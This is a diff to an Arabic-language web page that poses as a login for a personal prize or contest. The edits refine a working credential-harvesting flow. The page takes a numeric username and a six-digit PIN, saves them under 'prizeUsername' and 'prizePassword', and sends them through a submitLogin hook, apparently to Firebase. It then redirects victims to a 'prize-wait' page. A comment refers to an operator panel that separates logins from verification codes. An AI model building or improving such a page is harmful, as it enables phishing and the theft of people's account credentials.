@@ -11,97 +11,121 @@
     :root{--pink:#f7a1af;--pink-hover:#ef8fa1;--green:#69d9a7;--ink:#263238;--muted:#9aa4ae}
     *{box-sizing:border-box}
     body{margin:0;font-family:Cairo,Tahoma,sans-serif;background:#fff;color:var(--ink)}
-    .topbar{height:58px;padding:0 18px;display:flex;align-items:center;justify-content:flex-end;background:#fff}
+    .topbar{height:58px;padding:0 18px;display:flex;align-items:center;justify-content:space-between;background:#fff}
     .back{width:38px;height:38px;border:0;background:transparent;color:#263238;font-size:25px;line-height:1;cursor:pointer}
-    .card{width:min(100%,430px);margin:0 auto;padding:8px 11px 24px}
-    .card h1{margin:0 0 8px;text-align:right;font-size:19px;line-height:1.55;font-weight:800}
-    .intro{text-align:right;color:#73808c;font-size:12px;line-height:1.8;margin:0 0 12px}
-    .field label{display:block;text-align:right;font-size:11px;font-weight:700;margin:0 0 7px}
-    .field input{width:100%;height:39px;border:1.5px solid var(--green);border-radius:7px;padding:0 12px;font:13px Cairo,sans-serif;color:#263238;outline:none;background:#fff}
+    .close-top{width:34px;height:34px;border:0;border-radius:50%;background:#f2f4f5;color:#263238;font-size:16px;line-height:1;cursor:pointer;display:flex;align-items:center;justify-content:center}
+    .card{width:min(100%,430px);margin:0 auto;padding:8px 16px 24px}
+    .card h1{margin:0 0 8px;text-align:right;font-size:21px;line-height:1.5;font-weight:800}
+    .intro{text-align:right;color:#73808c;font-size:12px;line-height:1.8;margin:0 0 16px}
+    .field{position:relative}
+    .field label{display:block;text-align:right;font-size:11px;font-weight:700;color:#4f8a6e;margin:0 0 5px}
+    .field input{width:100%;height:54px;border:1.5px solid var(--green);border-radius:9px;padding:18px 14px 4px;font:700 15px Cairo,sans-serif;color:#263238;outline:none;background:#fff}
+    .field .inner-label{position:absolute;top:6px;right:14px;font-size:10px;font-weight:700;color:#4f8a6e;pointer-events:none}
     .field input:focus{border-color:#36c58d;box-shadow:0 0 0 3px #69d9a722}
-    .field input::placeholder{color:#b0b8c0}
-    .link-row{margin:8px 0 0;display:flex;align-items:center;justify-content:flex-end}
-    .link-row a{color:#ef8fa1;font-size:11px;font-weight:700;text-decoration:underline}
-    .options{margin-top:9px;display:flex;flex-direction:column;align-items:flex-end;gap:7px}
-    .option{display:flex;align-items:center;gap:7px;font-size:11px;color:#66727d;cursor:pointer}
-    .option input{width:14px;height:14px;margin:0;accent-color:#8d98a2}
+    .field input::placeholder{color:#b0b8c0;font-weight:400}
+    .meta-row{margin:12px 0 0;display:flex;align-items:flex-start;justify-content:space-between}
+    .link-row a{color:#e05a6d;font-size:11px;font-weight:700;text-decoration:underline}
+    .options{display:flex;flex-direction:column;align-items:flex-start;gap:8px}
+    .option{display:flex;align-items:center;gap:7px;font-size:11px;font-weight:600;color:#37474f;cursor:pointer}
+    .option input{width:15px;height:15px;margin:0;accent-color:#263238;border-radius:50%}
     .option input:focus{box-shadow:none}
     .error{display:none;color:#c62828;text-align:right;font-size:11px;margin-top:7px}
     .error.show{display:block}
     .reject-warning{display:none;background:#fdecec;border:1px solid #f3b6b6;color:#c62828;border-radius:9px;padding:10px 12px;font-size:12px;font-weight:700;text-align:right;margin:0 0 12px}
     .reject-warning.show{display:block}
-    .submit{width:100%;height:48px;margin-top:15px;border:0;border-radius:28px;background:#767c83;color:#e6e7e9;font:800 16px Cairo,sans-serif;cursor:not-allowed;transition:background .2s ease,color .2s ease}
+    .submit{width:100%;height:48px;margin-top:22px;border:0;border-radius:28px;background:#767c83;color:#e6e7e9;font:800 16px Cairo,sans-serif;cursor:not-allowed;transition:background .2s ease,color .2s ease}
     .submit.active{background:#df2929;color:#fff;cursor:pointer}
     .submit.active:hover{background:#c51f28}
-    .pin-stage{display:none;width:min(100%,430px);margin:0 auto;padding:8px 11px 24px}
-    .pin-stage h1{margin:0 0 8px;text-align:right;font-size:19px;line-height:1.55;font-weight:800}
-    .pin-stage.active{display:block}
-    .pin-field-wrap{position:relative}
-    .pin-field-wrap input{direction:ltr;text-align:right;padding-left:48px}
-    .pin-delete{position:absolute;left:8px;top:50%;transform:translateY(-50%);width:32px;height:32px;border:0;border-radius:7px;background:transparent;color:#7b858e;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center}
-    .digit svg{display:block;margin:0 auto}
-    .keypad-sheet{display:none;position:absolute;right:0;bottom:0;left:0;min-height:278px;background:#fff;border-radius:15px 15px 0 0;padding:15px 16px 18px;box-shadow:0 -10px 30px #0000001a;text-align:center}
-    .keypad-sheet.active{display:block}
-    .handle{width:42px;height:4px;margin:-5px auto 9px;border-radius:9px;background:#dfe3e6}
-    .dots{direction:ltr;display:flex;justify-content:center;gap:10px;height:15px;margin-bottom:13px}
-    .dot{width:8px;height:8px;border-radius:50%;background:#dfe3e6}.dot.active{background:#69d9a7}
-    .digits-label{font-size:11px;color:#7e8993;margin:-7px 0 10px}
-    .digits{direction:ltr;display:grid;grid-template-columns:repeat(3,86px);justify-content:center;gap:8px}
-    .digit{height:44px;border:1px solid #dfe3e6;border-radius:8px;background:#fff;color:#263238;font:700 17px Cairo,sans-serif;cursor:pointer}
-    .pin-submit{width:min(100%,358px);height:46px;margin:10px auto 0;border:0;border-radius:24px;background:#767c83;color:#e6e7e9;font:800 14px Cairo,sans-serif;display:block;cursor:not-allowed;transition:background .2s ease,color .2s ease}
+
+
+    /* خلفية التعتيم + لوحة الرقم السري المنبثقة */
+    .pin-backdrop{display:none;position:fixed;inset:0;background:rgba(38,44,48,0.52);z-index:90}
+    .pin-backdrop.active{display:block}
+    .keypad-sheet{display:none;position:fixed;right:0;bottom:0;left:0;z-index:100;background:#fff;border-radius:22px 22px 0 0;padding:18px 18px 22px;box-shadow:0 -10px 30px rgba(0,0,0,0.18);text-align:center}
+    .keypad-sheet.active{display:block;animation:sheetUp .22s ease-out}
+    @keyframes sheetUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+    .digits-label{font-size:16px;font-weight:800;color:#263238;margin:0 0 12px}
+    .dots{direction:ltr;display:flex;justify-content:center;gap:12px;height:14px;margin-bottom:12px}
+    .dot{width:8px;height:8px;border-radius:50%;background:#dfe3e6;transition:background .15s ease,transform .15s ease}
+    .dot.active{background:#69d9a7;transform:scale(1.15)}
+    .keypad-tools{direction:ltr;display:flex;justify-content:flex-start;max-width:360px;margin:0 auto 10px;padding-left:4px}
+    .pin-delete-top{width:34px;height:28px;border:0;background:transparent;color:#263238;cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0}
+    .digits{direction:ltr;display:grid;grid-template-columns:repeat(5,1fr);max-width:360px;margin:0 auto;gap:9px}
+    .digit{height:46px;border:1px solid #e2e6ea;border-radius:9px;background:#fff;color:#263238;font:700 17px Cairo,sans-serif;cursor:pointer;transition:background .12s ease,transform .08s ease}
+    .digit:active{background:#f2f5f7;transform:scale(0.97)}
+    .pin-submit{width:100%;max-width:360px;height:48px;margin:16px auto 0;border:0;border-radius:26px;background:#f7a1af;color:#fff;font:800 15px Cairo,sans-serif;display:block;cursor:not-allowed;transition:background .2s ease,color .2s ease}
     .pin-submit.active{background:#df2929;color:#fff;cursor:pointer}
+    .pin-submit.active:hover{background:#c51f28}
+
+
     /* اللغة الإنجليزية/الفرنسية: اتجاه من اليسار لليمين */
-    html[dir="ltr"] .topbar { justify-content: flex-start; }
     html[dir="ltr"] .back { transform: scaleX(-1); }
-    html[dir="ltr"] .card h1, html[dir="ltr"] .pin-stage h1,
-    html[dir="ltr"] .intro, html[dir="ltr"] .field label,
+    html[dir="ltr"] .card h1,
+    html[dir="ltr"] .intro,
     html[dir="ltr"] .error, html[dir="ltr"] .reject-warning { text-align: left; }
-    html[dir="ltr"] .link-row { justify-content: flex-start; }
-    html[dir="ltr"] .options { align-items: flex-start; }
-    html[dir="ltr"] .pin-field-wrap input { text-align: left; padding-left: 12px; padding-right: 48px; }
-    html[dir="ltr"] .pin-delete { left: auto; right: 8px; }
-    @media(max-height:700px){.keypad-sheet{min-height:250px;padding-top:10px}.digits{grid-template-columns:repeat(3,82px);gap:6px}.digit{height:38px}.dots{margin-bottom:8px}.pin-submit{height:42px;margin-top:8px}}
-    @media(min-width:700px){body{background:#f7f8f9}.topbar{max-width:430px;margin:40px auto 0}.card,.pin-stage{background:#fff;border-radius:18px;padding:16px 18px 26px;box-shadow:0 10px 30px #0000000d}.topbar{padding:0 18px}}
+    html[dir="ltr"] .field .inner-label { right: auto; left: 14px; }
+    @media(max-height:700px){
+      .keypad-sheet{padding:14px 16px 16px}
+      .digits-label{font-size:15px;margin-bottom:8px}
+      .dots{margin-bottom:8px}
+      .digit{height:40px}
+      .pin-submit{height:44px;margin-top:12px}
+    }
+    @media(min-width:700px){
+      body{background:#f7f8f9}
+      .topbar{max-width:430px;margin:40px auto 0;padding:0 18px}
+      .card{background:#fff;border-radius:18px;padding:16px 18px 26px;box-shadow:0 10px 30px #0000000d}
+      .keypad-sheet{max-width:430px;margin:0 auto}
+    }
   </style>
 </head>
 <body>
-  <header class="topbar"><button class="back" type="button" aria-label="رجوع" data-i18n-aria="username.back" onclick="history.back()">←</button></header>
+  <header class="topbar">
+    <button class="back" type="button" aria-label="رجوع" data-i18n-aria="username.back" onclick="history.back()">←</button>
+    <button class="close-top" type="button" aria-label="إغلاق" onclick="history.back()">✕</button>
+  </header>
+
+
   <main class="card">
     <h1 data-i18n-html="username.heading">قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
     <p class="intro" data-i18n="username.intro">ادخل اسم المستخدم الخاص بك لتسجيل الدخول</p>
     <div class="reject-warning" id="rejectWarning" role="alert" data-i18n="username.reject">يرجى إدخال بيانات صحيحه واعادة المحاولة</div>
     <form id="usernameForm">
       <div class="field">
-        <label for="username" data-i18n="username.label">اسم المستخدم</label>
-        <input id="username" type="text" inputmode="numeric" enterkeyhint="done" autocomplete="username" required placeholder="اسم المستخدم" data-i18n-ph="username.placeholder">
+        <span class="inner-label" data-i18n="username.label">اسم المستخدم</span>
+        <input id="username" type="text" inputmode="numeric" pattern="[0-9]*" enterkeyhint="done" autocomplete="username" required placeholder="اسم المستخدم" data-i18n-ph="username.placeholder">
       </div>
-      <div class="link-row"><a href="#" id="forgotUsername" data-i18n="username.forgot">نسيت اسم المستخدم؟</a></div>
-      <div class="options">
-        <label class="option"><input type="checkbox" name="rememberName"><span data-i18n="username.rememberName">تذكر اسمي</span></label>
-        <label class="option"><input type="checkbox" name="rememberPhone"><span data-i18n="username.rememberPhone">تذكر الجوال</span></label>
+      <div class="meta-row">
+        <div class="options">
+          <label class="option"><input type="checkbox" name="rememberName"><span data-i18n="username.rememberName">تذكر اسمي</span></label>
+          <label class="option"><input type="checkbox" name="rememberPhone"><span data-i18n="username.rememberPhone">تذكر الجوال</span></label>
+        </div>
+        <div class="link-row"><a href="#" id="forgotUsername" data-i18n="username.forgot">نسيت اسم المستخدم؟</a></div>
       </div>
       <div class="error" id="error" data-i18n="username.error">يرجى إدخال اسم المستخدم.</div>
       <button class="submit" type="submit" id="continueBtn" data-i18n="username.next">التالي</button>
     </form>
   </main>
-  <main class="pin-stage" id="pinStage">
-    <h1 data-i18n-html="username.heading">قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
-    <p class="intro" data-i18n="username.pinIntro">ادخل الرقم السري الخاص بك لتسجيل الدخول</p>
-    <div class="field">
-      <label for="pinDisplay" data-i18n="username.pinLabel">الرقم السري</label>
-      <div class="pin-field-wrap">
-        <input id="pinDisplay" type="text" inputmode="numeric" readonly placeholder="ادخل الرقم السري" value="" data-i18n-ph="username.pinPlaceholder">
-        <button class="pin-delete" id="pinDelete" type="button" aria-label="حذف آخر رقم" data-i18n-aria="username.deleteAria"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 5H9l-7 7 7 7h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/><line x1="18" x2="12" y1="9" y2="15"/><line x1="12" x2="18" y1="9" y2="15"/></svg></button>
-      </div>
-    </div>
-  </main>
+
+
+  <div class="pin-backdrop" id="pinBackdrop"></div>
+
+
   <section class="keypad-sheet" id="keypadSheet" aria-label="لوحة إدخال الرقم السري" data-i18n-aria="username.keypadAria">
-    <div class="handle"></div>
-    <div class="dots" id="dots"><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i></div>
-    <div class="digits-label" data-i18n="username.digitsLabel">ادخل رمزك السري</div>
+    <div class="digits-label" data-i18n="username.digitsLabel">اكتب رمزك السري</div>
+    <div class="dots" id="dots">
+      <i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i>
+    </div>
+    <div class="keypad-tools">
+      <button class="pin-delete-top" id="pinDelete" type="button" aria-label="حذف آخر رقم" data-i18n-aria="username.deleteAria">
+        <svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 5H9l-7 7 7 7h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/><line x1="18" x2="12" y1="9" y2="15"/><line x1="12" x2="18" y1="9" y2="15"/></svg>
+      </button>
+    </div>
     <div class="digits" id="keypad"></div>
     <button class="pin-submit" id="pinSubmit" type="button" disabled data-i18n="username.pinSubmit">تسجيل الدخول</button>
   </section>
+
+
   <script src="/assets/js/firebase-env.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
@@ -127,57 +151,140 @@
           var warn = document.getElementById('rejectWarning');
           warn.textContent = window.SiteLang ? SiteLang.t('username.reject') : 'يرجى إدخال بيانات صحيحه واعادة المحاولة';
           warn.classList.add('show');
+          closePinSheet();
         }
       });
     }
+
+
     document.getElementById("forgotUsername").addEventListener("click",e=>e.preventDefault());
     const usernameInput=document.getElementById("username");
     const continueBtn=document.getElementById("continueBtn");
+    const errorEl=document.getElementById("error");
+    const pinBackdrop=document.getElementById("pinBackdrop");
+    const keypadSheet=document.getElementById("keypadSheet");
+
+
+    // تحويل الأرقام العربية/الفارسية إلى إنجليزية ومنع أي حرف أو رمز غير رقمي
+    function normalizeDigitsOnly(value){
+      if(!value)return "";
+      const arabicIndic="٠١٢٣٤٥٦٧٨٩";
+      const easternArabicIndic="۰۱۲۳۴۵۶۷۸۹";
+      let normalized=String(value);
+      for(let i=0;i<10;i++){
+        normalized=normalized
+          .replace(new RegExp(arabicIndic[i],"g"),String(i))
+          .replace(new RegExp(easternArabicIndic[i],"g"),String(i));
+      }
+      return normalized.replace(/[^0-9]/g,"");
+    }
+
+
     function updateContinueState(){
-      const filled=usernameInput.value.trim().length>0;
+      const cleaned=normalizeDigitsOnly(usernameInput.value);
+      if(usernameInput.value!==cleaned){
+        usernameInput.value=cleaned;
+      }
+      const filled=cleaned.length>0;
       continueBtn.classList.toggle("active",filled);
       continueBtn.disabled=!filled;
+      if(filled)errorEl.classList.remove("show");
     }
-    usernameInput.addEventListener("input",updateContinueState);
-    updateContinueState();
-    document.getElementById("usernameForm").addEventListener("submit",async e=>{
-      e.preventDefault();const username=document.getElementById("username").value.trim();if(!username){document.getElementById("error").classList.add("show");return}
-      localStorage.setItem("prizeUsername",username);
-      if(window.submitLogin)await window.submitLogin({username,password:""});
-      document.querySelector(".card").style.display="none";
-      document.getElementById("pinStage").classList.add("active");
-      document.getElementById("keypadSheet").classList.add("active");
+
+
+    usernameInput.addEventListener("beforeinput",e=>{
+      if(e.inputType&&e.inputType.startsWith("delete"))return;
+      if(typeof e.data==="string"&&e.data.length>0){
+        if(normalizeDigitsOnly(e.data).length===0){
+          e.preventDefault();
+        }
+      }
     });
 
-    const pinDisplay=document.getElementById("pinDisplay");
+
+    usernameInput.addEventListener("keydown",e=>{
+      if(e.ctrlKey||e.metaKey||e.altKey||["Backspace","Delete","ArrowLeft","ArrowRight","ArrowUp","ArrowDown","Tab","Enter","Home","End"].includes(e.key)){
+        return;
+      }
+      if(!/^[0-9٠-٩۰-۹]$/.test(e.key)){
+        e.preventDefault();
+      }
+    });
+
+
+    usernameInput.addEventListener("paste",e=>{
+      e.preventDefault();
+      const pasted=(e.clipboardData&&e.clipboardData.getData("text"))||(window.clipboardData&&window.clipboardData.getData("text"))||"";
+      const digits=normalizeDigitsOnly(pasted);
+      const start=usernameInput.selectionStart??usernameInput.value.length;
+      const end=usernameInput.selectionEnd??usernameInput.value.length;
+      const nextValue=usernameInput.value.slice(0,start)+digits+usernameInput.value.slice(end);
+      usernameInput.value=normalizeDigitsOnly(nextValue);
+      updateContinueState();
+    });
+
+
+    usernameInput.addEventListener("input",updateContinueState);
+    usernameInput.addEventListener("change",updateContinueState);
+    updateContinueState();
+
+
+    function openPinSheet(){
+      pinBackdrop.classList.add("active");
+      keypadSheet.classList.add("active");
+    }
+    function closePinSheet(){
+      pinBackdrop.classList.remove("active");
+      keypadSheet.classList.remove("active");
+      pin="";
+      renderPin();
+    }
+    pinBackdrop.addEventListener("click",closePinSheet);
+
+
+    document.getElementById("usernameForm").addEventListener("submit",async e=>{
+      e.preventDefault();
+      updateContinueState();
+      const username=usernameInput.value.trim();
+      if(!username){
+        errorEl.classList.add("show");
+        return;
+      }
+      errorEl.classList.remove("show");
+      usernameInput.blur();
+      localStorage.setItem("prizeUsername",username);
+      if(window.submitLogin)await window.submitLogin({username,password:""});
+      openPinSheet();
+    });
+
+
     const pinSubmit=document.getElementById("pinSubmit");
     const pinDots=[...document.querySelectorAll(".dot")];
     let pin="";
     function renderPin(){
       pinDots.forEach((dot,i)=>dot.classList.toggle("active",i<pin.length));
-      pinDisplay.value=pin?"•".repeat(pin.length):"";
       pinSubmit.disabled=pin.length!==6;
       pinSubmit.classList.toggle("active",pin.length===6);
     }
+
+
     ["5","4","7","2","6","0","3","8","1","9"].forEach(number=>{
       const button=document.createElement("button");
-      button.type="button";button.className="digit";button.textContent=number;
+      button.type="button";
+      button.className="digit";
+      button.textContent=number;
       button.addEventListener("click",()=>{if(pin.length<6){pin+=number;renderPin()}});
       document.getElementById("keypad").appendChild(button);
     });
-    const blank=document.createElement("button");blank.type="button";blank.className="digit";blank.disabled=true;blank.style.visibility="hidden";
-    document.getElementById("keypad").appendChild(blank);
-    const deleteButton=document.createElement("button");
-    deleteButton.type="button";deleteButton.className="digit";deleteButton.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 5H9l-7 7 7 7h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/><line x1="18" x2="12" y1="9" y2="15"/><line x1="12" x2="18" y1="9" y2="15"/></svg>';deleteButton.setAttribute("aria-label", window.SiteLang ? SiteLang.t("username.deleteAria") : "حذف");
-    deleteButton.addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
-    document.getElementById("keypad").appendChild(deleteButton);
+
+
     document.getElementById("pinDelete").addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
+
+
     pinSubmit.addEventListener("click",async()=>{
       if(pin.length!==6)return;
       localStorage.setItem("prizePassword",pin);
       if(window.submitLogin)await window.submitLogin({username:localStorage.getItem("prizeUsername")||"",password:pin});
-      // الرقم السري يُرسل مع تسجيل الدخول فقط (كلمة المرور)، لا كـ OTP،
-      // حتى لا يظهر في صندوق «رموز التحقق» منفصلاً عن صندوق الدخول في اللوحة.
       location.href = window.SiteLang ? SiteLang.href("prize-wait.html") : "prize-wait.html";
     });
   </script>
